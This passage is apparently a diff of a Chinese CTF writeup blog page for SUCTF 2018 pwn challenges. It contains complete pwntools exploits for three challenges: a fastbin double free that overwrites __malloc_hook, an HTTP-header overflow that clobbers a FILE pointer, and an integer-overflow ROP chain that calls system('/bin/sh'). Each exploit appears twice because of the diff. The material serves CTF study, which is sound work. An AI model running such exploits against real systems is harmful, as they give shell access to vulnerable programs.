class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice : '</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    rc()</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice : '</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x98</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'1234'</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'bbbb'</span>,<span class="string">'456798'</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'bbbb'</span>,<span class="string">'456798'</span>)</span><br><span class="line">create(<span class="number">0x28</span>,<span class="string">'bbbb'</span>,<span class="string">'456798'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">clean()</span><br><span class="line">create(<span class="number">0x98</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'1234'</span>)</span><br><span class="line">view()</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">main_arena = leak - <span class="number">0x58</span></span><br><span class="line">log.info(hex(main_arena))</span><br><span class="line">pause()</span><br><span class="line">libc_base = main_arena - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x10</span> </span><br><span class="line">log.info(<span class="string">"libc_base is &#123;&#125;"</span>.format(hex(libc_base)))</span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = <span class="number">0xf02a4</span> + libc_base</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>,p64(malloc_hook - <span class="number">0x23</span>),<span class="string">'1234'</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'bbbb'</span>,<span class="string">'456798'</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'bbbb'</span>,<span class="string">'456798'</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">0x13</span> + p64(one_gadget),<span class="string">'1234'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+local = 0
+
+if local:
+    p = process(&#39;./ez_heap&#39;)
+    elf = ELF(&#39;./ez_heap&#39;)
+    libc = elf.libc
+else:
+    host = &#39;43.254.3.203&#39;
+    port = &#39;10006&#39;
+    p = remote(host,port)
+    elf = ELF(&#39;./ez_heap&#39;)
+    libc = ELF(&#39;./libc-2.23.so&#39;)
+
+context.arch = elf.arch
+#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+context.log_level=&#39;debug&#39;
+
+def sd(content):
+    p.send(content)
+
+def sl(content):
+    p.sendline(content)
+
+def rc():
+    return p.recv()
+
+def ru(content):
+    return p.recvuntil(content)
+
+def create(size,name,t):
+    ru(&#39;Your choice : &#39;)
+    sl(&#39;1&#39;)
+    ru(&#39;Length of the name :&#39;)
+    sl(str(size))
+    ru(&#39;The name of animal :&#39;)
+    sd(name)
+    ru(&#39;The kind of the animal :&#39;)
+    sl(t)
+
+def view():
+    ru(&#39;Your choice : &#39;)
+    sl(&#39;2&#39;)
+
+def delete(idx):
+    ru(&#39;Your choice : &#39;)
+    sl(&#39;3&#39;)
+    rc()
+    sl(str(idx))
+
+def clean():
+    ru(&#39;Your choice : &#39;)
+    sl(&#39;4&#39;)
+
+
+create(0x98,&#39;a&#39;*8,&#39;1234&#39;)
+create(0x68,&#39;bbbb&#39;,&#39;456798&#39;)
+create(0x68,&#39;bbbb&#39;,&#39;456798&#39;)
+create(0x28,&#39;bbbb&#39;,&#39;456798&#39;)
+
+delete(0)
+clean()
+create(0x98,&#39;a&#39;*8,&#39;1234&#39;)
+view()
+
+ru(&#39;a&#39;*8)
+leak = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+main_arena = leak - 0x58
+log.info(hex(main_arena))
+pause()
+libc_base = main_arena - libc.symbols[&#39;__malloc_hook&#39;] - 0x10 
+log.info(&quot;libc_base is {}&quot;.format(hex(libc_base)))
+malloc_hook = libc_base + libc.symbols[&#39;__malloc_hook&#39;]
+system = libc_base + libc.symbols[&#39;system&#39;]
+one_gadget = 0xf02a4 + libc_base
+
+delete(1)
+delete(2)
+delete(1)
+
+create(0x68,p64(malloc_hook - 0x23),&#39;1234&#39;)
+create(0x68,&#39;bbbb&#39;,&#39;456798&#39;)
+create(0x68,&#39;bbbb&#39;,&#39;456798&#39;)
+
+create(0x68,&#39;a&#39;*0x13 + p64(one_gadget),&#39;1234&#39;)
+
+delete(0)
+delete(0)
+p.interactive()
+</code></pre>
 <h4 id="easy-overflow-file-structure"><a href="#easy-overflow-file-structure" class="headerlink" title="easy_overflow_file_structure"></a>easy_overflow_file_structure</h4><p>IO_FILE利用的简化版</p>
 <p>漏洞点: 解析请求头字段的循环退出不当，导致可以写入多次，导致溢出，可以覆盖掉文件流指针</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall lookForHeader(const char *strings, __int64 input, signed int size, _BYTE *target, unsigned int count)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v5; // rax</span><br><span class="line">  _BYTE *v6; // rdx</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  _BYTE *v8; // [rsp+0h] [rbp-40h]</span><br><span class="line">  unsigned int v9; // [rsp+8h] [rbp-38h]</span><br><span class="line">  signed int v10; // [rsp+Ch] [rbp-34h]</span><br><span class="line">  unsigned int n; // [rsp+2Ch] [rbp-14h]</span><br><span class="line">  size_t n_4; // [rsp+30h] [rbp-10h]</span><br><span class="line">  unsigned int j; // [rsp+38h] [rbp-8h]</span><br><span class="line">  signed int i; // [rsp+3Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v10 = size;</span><br><span class="line">  v8 = target;</span><br><span class="line">  v9 = count;</span><br><span class="line">  n = strlen(strings);</span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v10 - n;</span><br><span class="line">    if ( (signed int)result &lt;= i )</span><br><span class="line">      break;</span><br><span class="line">    if ( !strncmp((const char *)(input + i), strings, n) &amp;&amp; *(_BYTE *)(i + n + input) == 58 )</span><br><span class="line">    &#123;</span><br><span class="line">      for ( i += n + 1; i &lt; v10 &amp;&amp; (*(_BYTE *)(i + input) == 32 || *(_BYTE *)(i + input) == 9); ++i )</span><br><span class="line">        ;</span><br><span class="line">      for ( j = i; j &lt; v10; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( *(_BYTE *)(j + input) == 35 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( j - i + 1 &lt;= v9 )</span><br><span class="line">          &#123;</span><br><span class="line">            n_4 = i + input;</span><br><span class="line">            while ( n_4 &lt; (unsigned __int64)j + input )</span><br><span class="line">            &#123;</span><br><span class="line">              v5 = v8++;</span><br><span class="line">              v6 = (_BYTE *)n_4++;</span><br><span class="line">              *v5 = *v6;</span><br><span class="line">            &#125;</span><br><span class="line">            *v8 = 0;</span><br><span class="line">          &#125;</span><br><span class="line">          break;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./eofs')</span></span><br><span class="line">p = remote(<span class="string">'43.254.3.203'</span>,<span class="string">"10002"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"GET / HTTP/1.1#"</span></span><br><span class="line">payload +=<span class="string">" Host:"</span>+<span class="string">"a"</span>*<span class="number">126</span> + <span class="string">"#"</span></span><br><span class="line">payload += <span class="string">" ResearchField:"</span>+ <span class="string">'a'</span>*<span class="number">126</span> +<span class="string">"#"</span></span><br><span class="line">payload +=<span class="string">" ResearchField:"</span>+ <span class="string">'a'</span>*<span class="number">2</span> + p64(<span class="number">0x6021a0</span>) +<span class="string">"#"</span></span><br><span class="line">payload += <span class="string">" Username: "</span> + p64(<span class="number">0xdeadbeef</span>)*<span class="number">4</span> + <span class="string">"#"</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload.ljust(<span class="number">8000</span>,<span class="string">'b'</span>))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code>__int64 __fastcall lookForHeader(const char *strings, __int64 input, signed int size, _BYTE *target, unsigned int count)
+{
+  _BYTE *v5; // rax
+  _BYTE *v6; // rdx
+  __int64 result; // rax
+  _BYTE *v8; // [rsp+0h] [rbp-40h]
+  unsigned int v9; // [rsp+8h] [rbp-38h]
+  signed int v10; // [rsp+Ch] [rbp-34h]
+  unsigned int n; // [rsp+2Ch] [rbp-14h]
+  size_t n_4; // [rsp+30h] [rbp-10h]
+  unsigned int j; // [rsp+38h] [rbp-8h]
+  signed int i; // [rsp+3Ch] [rbp-4h]
+
+  v10 = size;
+  v8 = target;
+  v9 = count;
+  n = strlen(strings);
+  for ( i = 0; ; ++i )
+  {
+    result = v10 - n;
+    if ( (signed int)result &lt;= i )
+      break;
+    if ( !strncmp((const char *)(input + i), strings, n) &amp;&amp; *(_BYTE *)(i + n + input) == 58 )
+    {
+      for ( i += n + 1; i &lt; v10 &amp;&amp; (*(_BYTE *)(i + input) == 32 || *(_BYTE *)(i + input) == 9); ++i )
+        ;
+      for ( j = i; j &lt; v10; ++j )
+      {
+        if ( *(_BYTE *)(j + input) == 35 )
+        {
+          if ( j - i + 1 &lt;= v9 )
+          {
+            n_4 = i + input;
+            while ( n_4 &lt; (unsigned __int64)j + input )
+            {
+              v5 = v8++;
+              v6 = (_BYTE *)n_4++;
+              *v5 = *v6;
+            }
+            *v8 = 0;
+          }
+          break;
+        }
+      }
+    }
+  }
+  return result;
+}
+</code></pre><p>exp:</p>
+<pre><code class="python">from pwn import*
+context.log_level = &quot;debug&quot;
+
+#p = process(&#39;./eofs&#39;)
+p = remote(&#39;43.254.3.203&#39;,&quot;10002&quot;)
+
+payload = &quot;GET / HTTP/1.1#&quot;
+payload +=&quot; Host:&quot;+&quot;a&quot;*126 + &quot;#&quot;
+payload += &quot; ResearchField:&quot;+ &#39;a&#39;*126 +&quot;#&quot;
+payload +=&quot; ResearchField:&quot;+ &#39;a&#39;*2 + p64(0x6021a0) +&quot;#&quot;
+payload += &quot; Username: &quot; + p64(0xdeadbeef)*4 + &quot;#&quot;
+
+p.sendline(payload.ljust(8000,&#39;b&#39;))
+p.recv()
+
+p.interactive()
+</code></pre>
 <h4 id="int"><a href="#int" class="headerlink" title="int"></a>int</h4><p>程序的逻辑很简单，存在一个整数溢出。通过整数溢出可以造成栈溢出，就可以进行rop了。</p>
 <p>这里我一开始比较困惑的是那个alloca函数，它通过ida反编译后参数很奇怪，我还以为进行了什么操作。直到我自己写了个测试alloca函数的程序，发现原来这个函数不在glibc库中，它由一些汇编语句构成，最终结果是将栈的空间增大，并返回一个内存指针。</p>
 <p>测试程序：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int *a;</span><br><span class="line">    a = alloca(16);</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>拖进ida中看下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040054E ; 4:   v3 = alloca(32LL);</span><br><span class="line">.text:000000000040054E                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000400557                 mov     [rbp+var_8], rax</span><br><span class="line">.text:000000000040055B                 xor     eax, eax</span><br><span class="line">.text:000000000040055D                 mov     eax, 10h</span><br><span class="line">.text:0000000000400562                 sub     rax, 1</span><br><span class="line">.text:0000000000400566                 add     rax, 1Fh</span><br><span class="line">.text:000000000040056A                 mov     esi, 10h</span><br><span class="line">.text:000000000040056F                 mov     edx, 0</span><br><span class="line">.text:0000000000400574                 div     rsi</span><br><span class="line">.text:0000000000400577                 imul    rax, 10h</span><br><span class="line">.text:000000000040057B                 sub     rsp, rax</span><br><span class="line">.text:000000000040057E                 mov     rax, rsp</span><br><span class="line">.text:0000000000400581                 add     rax, 0Fh</span><br><span class="line">.text:0000000000400585                 shr     rax, 4</span><br><span class="line">.text:0000000000400589                 shl     rax, 4</span><br><span class="line">.text:000000000040058D                 mov     [rbp+var_10], rax</span><br><span class="line">.text:0000000000400591                 mov     eax, 0</span><br></pre></td></tr></table></figure>
-<p>对比题目的代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040076D ; 13:   v3 = alloca(32LL);</span><br><span class="line">.text:000000000040076D                 mov     eax, 10h</span><br><span class="line">.text:0000000000400772                 sub     rax, 1</span><br><span class="line">.text:0000000000400776                 add     rax, 1Bh</span><br><span class="line">.text:000000000040077A                 mov     ecx, 10h</span><br><span class="line">.text:000000000040077F                 mov     edx, 0</span><br><span class="line">.text:0000000000400784                 div     rcx</span><br><span class="line">.text:0000000000400787                 imul    rax, 10h</span><br><span class="line">.text:000000000040078B                 sub     rsp, rax</span><br><span class="line">.text:000000000040078E                 mov     rax, rsp</span><br><span class="line">.text:0000000000400791                 add     rax, 0Fh</span><br><span class="line">.text:0000000000400795                 shr     rax, 4</span><br><span class="line">.text:0000000000400799 ; 14:   buf = (16 * ((&amp;v6 + 3) &gt;&gt; 4));</span><br><span class="line">.text:0000000000400799                 shl     rax, 4</span><br><span class="line">.text:000000000040079D                 mov     [rbp+buf], rax</span><br></pre></td></tr></table></figure>
-<p>可以发现其实  v3 = alloca(32LL); 和buf = (16 * ((&amp;v6 + 3) &gt;&gt; 4));这两条反编译后的语句相当于   buf = alloca(32);</p>
+<pre><code>#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+
+int main()
+{
+    int *a;
+    a = alloca(16);
+    return 0;
+
+}
+</code></pre><p>拖进ida中看下</p>
+<pre><code>.text:000000000040054E ; 4:   v3 = alloca(32LL);
+.text:000000000040054E                 mov     rax, fs:28h
+.text:0000000000400557                 mov     [rbp+var_8], rax
+.text:000000000040055B                 xor     eax, eax
+.text:000000000040055D                 mov     eax, 10h
+.text:0000000000400562                 sub     rax, 1
+.text:0000000000400566                 add     rax, 1Fh
+.text:000000000040056A                 mov     esi, 10h
+.text:000000000040056F                 mov     edx, 0
+.text:0000000000400574                 div     rsi
+.text:0000000000400577                 imul    rax, 10h
+.text:000000000040057B                 sub     rsp, rax
+.text:000000000040057E                 mov     rax, rsp
+.text:0000000000400581                 add     rax, 0Fh
+.text:0000000000400585                 shr     rax, 4
+.text:0000000000400589                 shl     rax, 4
+.text:000000000040058D                 mov     [rbp+var_10], rax
+.text:0000000000400591                 mov     eax, 0
+</code></pre><p>对比题目的代码</p>
+<pre><code>.text:000000000040076D ; 13:   v3 = alloca(32LL);
+.text:000000000040076D                 mov     eax, 10h
+.text:0000000000400772                 sub     rax, 1
+.text:0000000000400776                 add     rax, 1Bh
+.text:000000000040077A                 mov     ecx, 10h
+.text:000000000040077F                 mov     edx, 0
+.text:0000000000400784                 div     rcx
+.text:0000000000400787                 imul    rax, 10h
+.text:000000000040078B                 sub     rsp, rax
+.text:000000000040078E                 mov     rax, rsp
+.text:0000000000400791                 add     rax, 0Fh
+.text:0000000000400795                 shr     rax, 4
+.text:0000000000400799 ; 14:   buf = (16 * ((&amp;v6 + 3) &gt;&gt; 4));
+.text:0000000000400799                 shl     rax, 4
+.text:000000000040079D                 mov     [rbp+buf], rax
+</code></pre><p>可以发现其实  v3 = alloca(32LL); 和buf = (16 * ((&amp;v6 + 3) &gt;&gt; 4));这两条反编译后的语句相当于   buf = alloca(32);</p>
 <p>程序的漏洞点</p>
-<p><img src="/picture/1542680568249.png" alt="1542680568249"></p>
+<p><img src="/picture/1542680568249.png" srcset="/img/loading.gif" alt="1542680568249"></p>
 <p>它后面read函数读入数据的大小和alloca函数分配的大小是由我们输入控制的，所以可以控制它为一个很大的值，造成整数溢出，那么可以分配一个小空间，但是可以读取很多数据。那么就会造成栈溢出。</p>
 <p>栈的大小要通过调试来得到，dest的地址为0x7ffd035211b0</p>
-<p><img src="/picture/1542680869571.png" alt="1542680869571"></p>
+<p><img src="/picture/1542680869571.png" srcset="/img/loading.gif" alt="1542680869571"></p>
 <p>dest与rbp的距离</p>
-<p><img src="/picture/1542680974136.png" alt="1542680974136"></p>
+<p><img src="/picture/1542680974136.png" srcset="/img/loading.gif" alt="1542680974136"></p>
 <p>所以dest + 12 距离返回地址的偏移为  0x80-12 + 8 = 124</p>
 <p>栈的大小知道了，剩下的就是怎么进行rop利用。先泄露出libc地址，然后调用system函数来getshell。</p>
 <p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./int'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./int'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.arch = elf.arch</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">rc()</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x0400824")</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004008f3</span></span><br><span class="line">payload = p32(<span class="number">0x6e696b53</span>) + p32(<span class="number">0x1</span>) + p32(<span class="number">0xffffffff</span>)  </span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">124</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">'puts'</span>])</span><br><span class="line">payload += p64(<span class="number">0x4005E0</span>)<span class="comment"># start</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">info(<span class="string">"libc.address: &#123;&#125;"</span>.format(hex(libc.address)))</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x6E696B53</span>) + p32(<span class="number">1</span>) + p32(<span class="number">0xffffffff</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">124</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(libc.search(<span class="string">"/bin/sh\x00"</span>).next())</span><br><span class="line">payload += p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
 
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-      <div>
-        
+p = process(&#39;./int&#39;)
+elf = ELF(&#39;./int&#39;)
+libc = elf.libc
 
 
+context.arch = elf.arch
+context.log_level=&#39;debug&#39;
+
+def sd(content):
+    p.send(content)
+
+def sl(content):
+    p.sendline(content)
+
+def rc():
+    return p.recv()
+
+def ru(content):
+    return p.recvuntil(content)
 
 
-  
+rc()
+#gdb.attach(p,&quot;b *0x0400824&quot;)
+pop_rdi = 0x00000000004008f3
+payload = p32(0x6e696b53) + p32(0x1) + p32(0xffffffff)  
+p.send(payload)
+
+payload = &#39;a&#39;*124
+payload += p64(pop_rdi)
+payload += p64(elf.got[&#39;puts&#39;])
+payload += p64(elf.plt[&#39;puts&#39;])
+payload += p64(0x4005E0)# start
+p.send(payload)
 
 
+leak = u64(p.recv(6).ljust(8, &quot;\x00&quot;))
+libc.address = leak - libc.symbols[&#39;puts&#39;]
+info(&quot;libc.address: {}&quot;.format(hex(libc.address)))
 
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>zs0zrc</li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    
-    <a href="http://yoursite.com/2018/11/19/2018-11-19-SUCTF-招新赛-2018-writeup/" title="SUCTF 招新赛 2018 writeup">http://yoursite.com/2018/11/19/2018-11-19-SUCTF-招新赛-2018-writeup/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
-</ul>
+payload = p32(0x6E696B53) + p32(1) + p32(0xffffffff)
+sd(payload)
 
-      </div>
-    
+payload = &#39;a&#39;*124
+payload += p64(pop_rdi)
+payload += p64(libc.search(&quot;/bin/sh\x00&quot;).next())
+payload += p64(libc.symbols[&#39;system&#39;])
+payload += p64(0xdeadbeef)
+sd(payload)
 
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/writeup/" rel="tag"># writeup</a>
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
-        </div>
-      
+p.interactive()
+</code></pre>
 
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2018/11/14/2018-11-14-SQL注入学习/" rel="next" title="SQL注入学习">
-                <i class="fa fa-chevron-left"></i> SQL注入学习
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/11/20/2018-11-20-2018-高校网络信息安全管理运维挑战赛-pwn-writeup/" rel="prev" title="2018-高校网络信息安全管理运维挑战赛-pwn-writeup">
-                2018-高校网络信息安全管理运维挑战赛-pwn-writeup <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-  </div>
-
-
-          </div>
-          
-
-  
-
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="zs0zrc">
-            
-              <p class="site-author-name" itemprop="name">zs0zrc</p>
-              <div class="site-description motion-element" itemprop="description">zs0zrc's blog</div>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
+            </div>
+            <hr>
+            <div>
+              <p>
                 
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">53</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
-                </div>
-              
-
-              
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF-s-writeup/">CTF&#39;s writeup</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
                 
                 
-                <div class="site-state-item site-state-categories">
-                  
+                  <span>
+                <i class="iconfont icon-tag"></i>
                     
-                      <a href="/categories/">
+                      <a class="hover-with-bg" href="/tags/writeup/">writeup</a>
                     
-                  
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
                     
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
